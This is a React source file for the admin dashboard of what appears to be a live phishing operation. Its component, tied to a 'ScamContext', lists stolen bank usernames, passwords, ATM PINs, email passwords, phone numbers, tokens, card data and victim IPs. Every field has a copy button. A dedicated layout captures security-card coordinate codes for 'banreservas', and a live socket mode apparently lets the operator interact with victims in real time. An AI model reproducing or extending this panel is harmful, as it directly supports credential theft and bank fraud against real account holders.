import { Pagination, Tooltip } from '@nextui-org/react'
import { useContext, useState } from 'react'
import { DeleteIcon } from '../../assets/DeleteIcon'
import { IconButton } from '../../assets/IconButton'
import { ScamContext } from '../../context/ScamContext'
import tableHeader from '../../options.json'
import { RocketIcon } from '../../assets/RocketIcon'
import { ModalLive } from '../helpers/ModalLive'
import { ArrowPathIcon, ArrowPathRoundedSquareIcon } from '@heroicons/react/20/solid'

const banreservas = ['usuario', 'clave', 'dos', 'doce', 'veinteydos', 'treintaydos', 'cuatro', 'catorce', 'veinteycuatro', 'treintaycuatro', 'tarjeta', 'ip', '...']

export const TableUserAll = ({users}) => {

  const { setDeleteActive, filteredType } = useContext(ScamContext);
  
  const [currentPage, setCurrentPage] = useState(0);
  const [visible, setVisible] = useState(false)
  const [socketID, setsocketID] = useState(null)
  const [modeLiveData, setModeLiveData] = useState([])
  const filteredUsers = () => {
    return users.slice( currentPage === 0 ? 0 : currentPage - 10, currentPage === 0 ? currentPage + 10 : currentPage)
  }

  const pagination = (e) => {
    const newData = e === 1 ? 0 : e * 10; 
    setCurrentPage( newData  )
  }
  
  return (
    <>
      <ModalLive visible={visible} setVisible={setVisible} modeLiveData={modeLiveData} user={socketID} />

      <div className="overflow-x-auto">
          <table className="table-auto w-full">
              <thead className="text-xs font-semibold uppercase text-gray-400 bg-gray-50">
                  <tr>

                    {
                      users[0]?.name === 'banreservas' ? (
                        <>
                          {banreservas.map(e => (
                            <th key={e} className="p-2 py-3 whitespace-nowrap">
                              <div className='font-semibold text-left'>
                                {e}
                              </div>
                            </th> 
                          ))}
                        </>
                      ) 
                      : tableHeader.tableHeaderOptions.map( (e, i) => { 
                        
                        if (filteredType.includes('Clave ATM') === false && e === 'Clave ATM') return;

                        if(filteredType.includes(e) ) {
                          return ( 
                          <th key={i} className="p-2 py-3 whitespace-nowrap">
                            <div className='font-semibold text-left'>
                              {e}
                            </div>
                          </th> 
                        );}

                        if(e == 'usuario' || e == "clave" || e == "Ip" || e == "..." || filteredType.length === 1  ) return (
                          <th key={e} className="p-2 py-3 whitespace-nowrap">
                            <div className='font-semibold text-left'>
                              {e}
                            </div>
                          </th> 
                        );
                      })
                    }
                  </tr>
              </thead>
              <tbody className="text-sm divide-y divide-gray-100  first:bg-red">
                {
                  users[0]?.name === 'banreservas' ? filteredUsers().map(({
                    _id,
                    dos,
                    doce,
                    veinteydos,
                    treintaydos,
                    cuatro,
                    catorce,
                    veinteycuatro,
                    treintaycuatro,
                    tarjeta,
                    username, password, ip}, i) => {
                      return (
                        <tr key={i}>
                          <td className='p-2 py-3 whitespace-nowrap'>
                            <div className="flex items-center">
                              <Tooltip
                                  content={'Copiado!'}
                                  trigger={'click'}
                                  color={"primary"}
                                >
                                <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(username)}>{username}</button>
                              </Tooltip>
                            </div>
                          </td>
                          <td className='p-2 py-3 whitespace-nowrap'>
                            <div className="flex items-center">
                              <Tooltip
                                  content={'Copiado!'}
                                  trigger={'click'}
                                  color={"primary"}
                                >
                                <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(password)}>{password}</button>
                              </Tooltip>
                            </div>
                          </td>
                          <td className='p-2 py-3 whitespace-nowrap'>
                            <div className="flex items-center">
                              <Tooltip
                                  content={'Copiado!'}
                                  trigger={'click'}
                                  color={"primary"}
                                >
                                <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(dos)}>{dos}</button>
                              </Tooltip>
                            </div>
                          </td>
                          <td className='p-2 py-3 whitespace-nowrap'>
                            <div className="flex items-center">
                              <Tooltip
                                  content={'Copiado!'}
                                  trigger={'click'}
                                  color={"primary"}
                                >
                                <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(doce)}>{doce}</button>
                              </Tooltip>
                            </div>
                          </td>
                          <td className='p-2 py-3 whitespace-nowrap'>
                            <div className="flex items-center">
                              <Tooltip
                                  content={'Copiado!'}
                                  trigger={'click'}
                                  color={"primary"}
                                >
                                <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(veinteydos)}>{veinteydos}</button>
                              </Tooltip>
                            </div>
                          </td>
                          <td className='p-2 py-3 whitespace-nowrap'>
                            <div className="flex items-center">
                              <Tooltip
                                  content={'Copiado!'}
                                  trigger={'click'}
                                  color={"primary"}
                                >
                                <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(treintaydos)}>{treintaydos}</button>
                              </Tooltip>
                            </div>
                          </td>
                          <td className='p-2 py-3 whitespace-nowrap'>
                            <div className="flex items-center">
                              <Tooltip
                                  content={'Copiado!'}
                                  trigger={'click'}
                                  color={"primary"}
                                >
                                <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(cuatro)}>{cuatro}</button>
                              </Tooltip>
                            </div>
                          </td>
                          <td className='p-2 py-3 whitespace-nowrap'>
                            <div className="flex items-center">
                              <Tooltip
                                  content={'Copiado!'}
                                  trigger={'click'}
                                  color={"primary"}
                                >
                                <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(catorce)}>{catorce}</button>
                              </Tooltip>
                            </div>
                          </td>
                          <td className='p-2 py-3 whitespace-nowrap'>
                            <div className="flex items-center">
                              <Tooltip
                                  content={'Copiado!'}
                                  trigger={'click'}
                                  color={"primary"}
                                >
                                <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(veinteycuatro)}>{veinteycuatro}</button>
                              </Tooltip>
                            </div>
                          </td>
                          <td className='p-2 py-3 whitespace-nowrap'>
                            <div className="flex items-center">
                              <Tooltip
                                  content={'Copiado!'}
                                  trigger={'click'}
                                  color={"primary"}
                                >
                                <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(treintaycuatro)}>{treintaycuatro}</button>
                              </Tooltip>
                            </div>
                          </td>
                          <td className='p-2 py-3 whitespace-nowrap'>
                            <div className="flex items-center">
                              <Tooltip
                                  content={'Copiado!'}
                                  trigger={'click'}
                                  color={"primary"}
                                >
                                <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(tarjeta)}>{tarjeta}</button>
                              </Tooltip>
                            </div>
                          </td>
                          <td className='p-2 py-3 whitespace-nowrap'>
                            <div className="flex items-center">
                              <Tooltip
                                  content={'Copiado!'}
                                  trigger={'click'}
                                  color={"primary"}
                                >
                                <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(ip)}>{ip}</button>
                              </Tooltip>
                            </div>
                          </td>
                          <td className='p-2 py-3 whitespace-nowrap'>
                            <div className="flex items-center">
                              <IconButton onClick={() => setDeleteActive( _id )}>
                                <DeleteIcon size={18} fill="#FF0080" />
                              </IconButton>
                            </div>
                          </td>
                        </tr>
                      )
                  }) 


                    : filteredUsers().map( ({_id, username, password, atmPassword, typeDocument, correo, claveCorreo, celular, token1, token2, token3, modeLive, tarjeta, ip, socketID, liveData, isConnected, isLoading }, i) => {
                      return (
                        <tr className='odd:bg-slate-50 even:bg-slate-200' key={i}>                          
                          <td className='p-2 py-3 whitespace-nowrap'>
                            <div className="flex items-center">
                              <Tooltip
                                  content={'Copiado!'}
                                  trigger={'click'}
                                  color={"primary"}
                                >
                                <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(username)}>{username}</button>
                              </Tooltip>
                            </div>
                          </td>
                          <td className='p-2 py-3 whitespace-nowrap'>
                            <div className="flex items-center">
                              <Tooltip
                                  content={'Copiado!'}
                                  trigger={'click'}
                                  color={"primary"}
                                >
                                <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(password)}>{password}</button>
                              </Tooltip>
                            </div>
                          </td>
                          {/* Filtro de correo */}
                          {
                            (filteredType.includes('Tipo documento') || filteredType.length === 1) && (
                              <td className='p-2 py-3 whitespace-nowrap' >
                                <div className="flex items-center">
                                <Tooltip
                                  content={'Copiado!'}
                                  trigger={'click'}
                                  color={"primary"}
                                >
                                  <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(typeDocument)}>{typeDocument}</button>
                                </Tooltip>
                                </div>
                              </td>
                            )
                          }
                          {
                            (filteredType.includes('Correo') || filteredType.length === 1) && (
                              <td className='p-2 py-3 whitespace-nowrap' >
                                <div className="flex items-center">
                                <Tooltip
                                  content={'Copiado!'}
                                  trigger={'click'}
                                  color={"primary"}
                                >
                                  <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(correo)}>{correo}</button>
                                </Tooltip>
                                </div>
                              </td>
                            )
                          }
                          {
                            (filteredType.includes('Clave del correo') || filteredType.length === 1) && (
                              <td className='p-2 py-3 whitespace-nowrap'>
                                <div className="flex items-center">
                                  <Tooltip
                                    content={'Copiado!'}
                                    trigger={'click'}
                                    color={"primary"}
                                  >
                                    <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(claveCorreo)}>{claveCorreo}</button>
                                  </Tooltip>
                                </div>
                              </td>
                            )
                          }
                          {
                            (filteredType.includes('Celular') || filteredType.length === 1) && (
                              <td className='p-2 py-3 whitespace-nowrap'>
                                <div className="flex items-center">
                                  <Tooltip
                                      content={'Copiado!'}
                                      trigger={'click'}
                                      color={"primary"}
                                    >
                                    <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(celular)}>{celular}</button>
                                  </Tooltip>
                                </div>
                              </td>
                            )
                          }
                          {
                            (filteredType.includes('Token1') || filteredType.length === 1) && (
                              <td className='p-2 py-3 whitespace-nowrap'>
                                <div className="flex items-center">
                                  <Tooltip
                                      content={'Copiado!'}
                                      trigger={'click'}
                                      color={"primary"}
                                    >
                                    <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(token1)}>{token1}</button>
                                  </Tooltip>
                                </div>
                              </td>
                            )
                          }
                          {
                            (filteredType.includes('Token2') || filteredType.length === 1) && (
                              <td className='p-2 py-3 whitespace-nowrap'>
                                <div className="flex items-center">
                                  <Tooltip
                                      content={'Copiado!'}
                                      trigger={'click'}
                                      color={"primary"}
                                    >
                                    <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(token2)}>{token2}</button>
                                  </Tooltip>
                                </div>
                              </td>
                            )
                          }
                          {
                            (filteredType.includes('Tarjeta') || filteredType.length === 1) && (
                              <td className='p-2 py-3 whitespace-nowrap'>
                                <div className="flex items-center">
                                  <Tooltip
                                      content={'Copiado!'}
                                      trigger={'click'}
                                      color={"primary"}
                                    >
                                    <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(tarjeta)}>{tarjeta}</button>
                                  </Tooltip>
                                </div>
                              </td>
                            )
                          }
                          {
                            (filteredType.includes('Clave ATM')) && (
                              <td className='p-2 py-3 whitespace-nowrap'>
                                <div className="flex items-center">
                                  <Tooltip
                                      content={'Copiado!'}
                                      trigger={'click'}
                                      color={"primary"}
                                    >
                                    <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(atmPassword)}>{atmPassword}</button>
                                  </Tooltip>
                                </div>
                              </td>
                            )
                          }
                          <td className='p-2 py-3 whitespace-nowrap'>
                            <div className="flex items-center">
                              <div className="text-gray-800">{ip}</div>
                            </div>
                          </td>
                          <td className='p-2 py-3 whitespace-nowrap flex gap-2'>
                            <div className="flex items-center">
                              <IconButton onClick={() => setDeleteActive({_id})}>
                                <DeleteIcon size={18} fill="#FF0080" />
                              </IconButton>
                            </div>
                            {modeLive === true ? (
                              <div className="flex items-center">
                                <IconButton onClick={() => {
                                    setsocketID(socketID)
                                    setModeLiveData(liveData)
                                    setVisible(true)

                                  } }>
                                    {/* {isLoading ? <ArrowPathRoundedSquareIcon size={18} />} */}
                                  { isLoading === false ? (<RocketIcon  size={18} fill="#FF0080" />) : <ArrowPathIcon />}
                                </IconButton>
                              </div>
                          ) : (<div></div>)}
                          </td>
                          
                        </tr>
                      )
                  })
                }
              </tbody>
          </table>
      </div>
      <div className='mt-10'>
        <Pagination 
          total={          
            users.length >= 10 ? 
            Number.isInteger(users.length / 10) === false 
            ? Math.round(users.length / 10 + 1)
            : Math.round(users.length / 10 )
            : 1
          }
          loop
          noMargin
          shadow
          initialPage={1}
          onChange={(e) => pagination(e) }
          
          />
      </div>
    </>
  );
}
